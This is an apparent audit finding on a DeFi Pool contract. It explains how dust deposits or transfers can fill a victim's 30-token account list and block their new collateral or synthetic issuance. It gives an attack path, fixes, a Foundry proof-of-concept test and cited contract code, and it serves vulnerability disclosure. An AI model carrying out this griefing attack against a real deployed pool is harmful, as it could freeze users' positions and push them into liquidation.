### Title
Griefing an account by maxing out `MAX_TOKENS_PER_USER` via dust deposits/transfers - ([File: contracts/Pool.sol](contracts/Pool.sol))

### Summary
`Pool` enforces a per-account cap `MAX_TOKENS_PER_USER = 30` shared across `debtTokensOfAccount` and `depositTokensOfAccount`. Entries are added automatically when a `DepositToken` balance goes 0 → non-zero, and both `deposit(amount_, onBehalfOf_)` and `transfer`/`transferFrom` let an unprivileged attacker push entries onto a victim's list. An attacker can fill a victim's list with 30 dust positions so that any subsequent new collateral deposit, new synthetic issuance, or deposit-token receipt for that account reverts with `UserReachedMaxTokens`. If the victim has open debt, the dust balances are locked by `_revertIfLocked`, so the victim cannot self-clean the list — the block can be permanent until debt is fully repaid.

### Finding Description
- The cap is enforced in `onlyIfAdditionWillNotReachMaxTokens`, which reverts when `debtTokensOfAccount.length(account_) + depositTokensOfAccount.length(account_) >= MAX_TOKENS_PER_USER` (30). [1](#0-0) 
- `addToDepositTokensOfAccount` / `addToDebtTokensOfAccount` are permissionless external functions gated only by "caller must be a registered token", so any balance-changing hook on a real token can push an entry. [2](#0-1) 
- `DepositToken._mint` adds the token to `account_`'s list whenever the recipient's prior balance is 0, and `deposit()` mints to an arbitrary `onBehalfOf_`. So `deposit(1 wei, victim)` on each registered deposit token adds an entry to the victim's list without the victim's consent. [3](#0-2) 
- `DepositToken._transfer` does the same on plain ERC20 transfers, giving a second vector (attacker deposits dust to themselves, then `transfer(victim, 1)`). [4](#0-3) 
- Removal only happens when a balance returns to 0 (`_burn`/`_transfer` → `removeFromDepositTokensOfAccount`), and `transfer`/`withdraw` are gated by `_revertIfLocked`/`unlockedBalanceOf`, which returns 0 for a victim whose `_issuableInUsd` is 0 (i.e., a victim at/below their collateralization limit cannot move the dust out). [5](#0-4) 
- The analogous `DebtToken` mint path calls `addToDebtTokensOfAccount` when a debt balance goes 0 → non-zero (per the `Pool` docstring "called from `DebtToken` when user's balance changes from `0`"), so issuance of any new synthetic also reverts once the shared cap is hit. [6](#0-5) 

Attack path (all unprivileged, no privileged role, no oracle manipulation):
1. For each registered deposit token `d[i]` (governor can register at most `MAX_TOKENS_PER_USER`), attacker calls `d[i].deposit(dustAmount, victim)` — or deposits to self then `transfer(victim, 1)`.
2. `depositTokensOfAccount[victim]` reaches 30.
3. Every subsequent action that would add a new token to the victim's lists reverts: depositing a collateral type the victim doesn't already hold, issuing a synthetic the victim doesn't already owe, and receiving any new deposit token (including via `Pool.liquidate` → `seize` if the liquidated token isn't already in the victim's... seize targets the liquidator, but any inbound transfer to the victim reverts).
4. If the victim has an unhealthy-or-maxed position (`_issuableInUsd == 0`), `unlockedBalanceOf(victim)` returns 0 for the dust tokens, so the victim cannot transfer or withdraw them to free list slots — the grief is sticky until the victim repays debt, and the attacker can re-fill instantly afterward.

### Impact Explanation
Temporary (debt-free victim: must spend gas to sweep dust out, and the attacker can re-grief at dust cost) to permanent-until-debt-repaid freezing of the victim's ability to add collateral or issue new synthetics. For a leveraged victim near liquidation this can block them from depositing a *different* collateral type to restore health, directly enabling a liquidation that healthy-position management would have prevented — a liveness/funds-at-risk break, matching the original `MAX_DELEGATES` griefing class.

### Likelihood Explanation
High reachability: requires only public `deposit`/`transfer` calls with dust amounts of underlying; cost is bounded by ~30 dust deposits plus gas. No privileged roles, no flash loans needed, no oracle manipulation. Modifiers (`onlyIfDepositTokenExists`, `whenNotPaused`, `nonReentrant`, SynthContext `_msgSender`) do not stop it — they only verify the token is registered and the pool is open. The victim-side mitigation (transferring dust out) is unavailable precisely when the victim most needs new collateral slots (debt-saturated account). One caveat: the attack only matters if the number of registered deposit + debt tokens is enough to fill 30 slots, or if the victim already uses several; with few registered tokens the attacker can only partially fill the cap.

### Recommendation
- Add an opt-in/claim pattern or a per-account allowlist for receiving new deposit-token entries (e.g., only add on `deposit` when `onBehalfOf_ == _msgSender()` or when the recipient has approved the sender).
- Allow anyone to remove a token from their own list when its balance is below a dust threshold, or make `unlockedBalanceOf`-style locks not apply to forced-inbound dust (e.g., exempt amounts the account never deposited).
- Alternatively, decouple the cap: track `depositTokensOfAccount` additions only for balances above a minimum deposit amount, so 1-wei spam cannot occupy slots.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {Pool} from "../contracts/Pool.sol";
import {DepositToken} from "../contracts/DepositToken.sol";
import {IERC20} from "../contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";

contract MaxTokensGriefTest is Test {
    // fork a deployment (e.g. mainnet Pool proxy) or use the repo's fixture setup
    Pool pool;
    address victim = address(0xBEEF);
    address attacker = address(0xBAD);

    function test_dust_fills_account_list() public {
        // given: victim already holds debt tokens + some deposit tokens, or pool
        //        has >= MAX_TOKENS_PER_USER registered deposit tokens
        address[] memory depTokens = pool.getDepositTokens();
        uint256 max = pool.MAX_TOKENS_PER_USER();

        vm.startPrank(attacker);
        uint256 added;
        for (uint256 i; i < depTokens.length && pool.debtTokensOfAccount.length(victim) + pool.depositTokensOfAccount.length(victim) < max; ++i) {
            DepositToken d = DepositToken(depTokens[i]);
            IERC20 underlying = d.underlying();
            deal(address(underlying), attacker, 1);
            underlying.approve(address(d), 1);
            d.deposit(1, victim); // adds depTokens[i] to victim's list without consent
            added++;
        }
        vm.stopPrank();
        assertEq(
            pool.debtTokensOfAccount.length(victim) + pool.depositTokensOfAccount.length(victim),
            max
        );

        // when: victim tries to deposit a collateral type they don't yet hold
        DepositToken newToken = DepositToken(depTokens[depTokens.length - 1]); // any unheld token
        IERC20 u = newToken.underlying();
        deal(address(u), victim, 100e18);
        vm.startPrank(victim);
        u.approve(address(newToken), 100e18);
        vm.expectRevert(Pool.UserReachedMaxTokens.selector);
        newToken.deposit(100e18, victim);

        // and: if victim has saturated debt (issuableInUsd == 0), the spam dust is locked
        //      so victim cannot clear slots
        (, , uint256 debtUsd, , uint256 issuableInUsd) = pool.debtPositionOf(victim);
        if (debtUsd > 0 && issuableInUsd == 0) {
            for (uint256 i; i < depTokens.length; ++i) {
                DepositToken d = DepositToken(depTokens[i]);
                if (d.balanceOf(victim) > 0) {
                    vm.expectRevert(DepositToken.NotEnoughFreeBalance.selector);
                    d.transfer(attacker, d.balanceOf(victim));
                }
            }
        }
        vm.stopPrank();
    }
}
```

Uncertain: `DebtToken.sol`'s exact mint/issue hook lines were not retrieved (the final grep returned only match counts), but `Pool.addToDebtTokensOfAccount`'s NatSpec confirms it is invoked by `DebtToken` on 0→non-zero balance changes, so the issuance-side revert holds. A runnable PoC also needs the repo's deployment fixtures or a mainnet/Optimism fork against the deployed `Pool` proxy.

### Citations

**File:** contracts/Pool.sol (L143-148)
```text
    modifier onlyIfAdditionWillNotReachMaxTokens(address account_) {
        if (debtTokensOfAccount.length(account_) + depositTokensOfAccount.length(account_) >= MAX_TOKENS_PER_USER) {
            revert UserReachedMaxTokens();
        }
        _;
    }
```

**File:** contracts/Pool.sol (L198-220)
```text
    /**
     * @notice Add a debt token to the per-account list
     * @dev This function is called from `DebtToken` when user's balance changes from `0`
     * @dev The caller should ensure to not pass `address(0)` as `_account`
     * @param account_ The account address
     */
    function addToDebtTokensOfAccount(address account_) external onlyIfAdditionWillNotReachMaxTokens(account_) {
        address _debtToken = _msgSender();
        _revertIfSenderIsNotDebtToken(_debtToken);
        if (!debtTokensOfAccount.add(account_, _debtToken)) revert DebtTokenAlreadyExists();
    }

    /**
     * @notice Add a deposit token to the per-account list
     * @dev This function is called from `DepositToken` when user's balance changes from `0`
     * @dev The caller should ensure to not pass `address(0)` as `_account`
     * @param account_ The account address
     */
    function addToDepositTokensOfAccount(address account_) external onlyIfAdditionWillNotReachMaxTokens(account_) {
        address _depositToken = _msgSender();
        _revertIfSenderIsNotDepositToken(_depositToken);
        if (!depositTokensOfAccount.add(account_, _depositToken)) revert DepositTokenAlreadyExists();
    }
```

**File:** contracts/DepositToken.sol (L211-237)
```text
    function deposit(
        uint256 amount_,
        address onBehalfOf_
    ) external override whenNotPaused nonReentrant onlyIfDepositTokenExists returns (uint256 _deposited, uint256 _fee) {
        if (amount_ == 0) revert AmountIsZero();
        if (onBehalfOf_ == address(0)) revert BeneficiaryIsNull();

        IPool _pool = pool;
        IERC20 _underlying = underlying;
        address _msgSender = _msgSender();
        address _treasury = address(_pool.treasury());

        if (_msgSender == _treasury) revert TreasuryCanNotDeposit();

        uint256 _balanceBefore = _underlying.balanceOf(_treasury);
        _underlying.safeTransferFrom(_msgSender, _treasury, amount_);
        amount_ = _underlying.balanceOf(_treasury) - _balanceBefore;

        (_deposited, _fee) = quoteDepositOut(amount_);
        if (_fee > 0) {
            _mint(_pool.feeCollector(), _fee);
        }

        _mint(onBehalfOf_, _deposited);

        emit CollateralDeposited(_msgSender, onBehalfOf_, amount_, _deposited, _fee);
    }
```

**File:** contracts/DepositToken.sol (L383-398)
```text
    function unlockedBalanceOf(address account_) public view override returns (uint256 _unlockedBalance) {
        IPool _pool = pool;

        (, , uint256 _debtInUsd, , uint256 _issuableInUsd) = _pool.debtPositionOf(account_);

        if (_debtInUsd == 0) {
            return balanceOf[account_];
        }

        if (_issuableInUsd > 0) {
            _unlockedBalance = Math.min(
                balanceOf[account_],
                _pool.masterOracle().quoteUsdToToken(address(underlying), _issuableInUsd.wadDiv(collateralFactor))
            );
        }
    }
```

**File:** contracts/DepositToken.sol (L517-525)
```text
        // Add this token to the deposit tokens list if the recipient is receiving it for the 1st time
        if (_recipientBalanceBefore == 0 && amount_ > 0) {
            pool.addToDepositTokensOfAccount(recipient_);
        }

        // Remove this token from the deposit tokens list if the sender's balance goes to zero
        if (amount_ > 0 && balanceOf[sender_] == 0) {
            pool.removeFromDepositTokensOfAccount(sender_);
        }
```
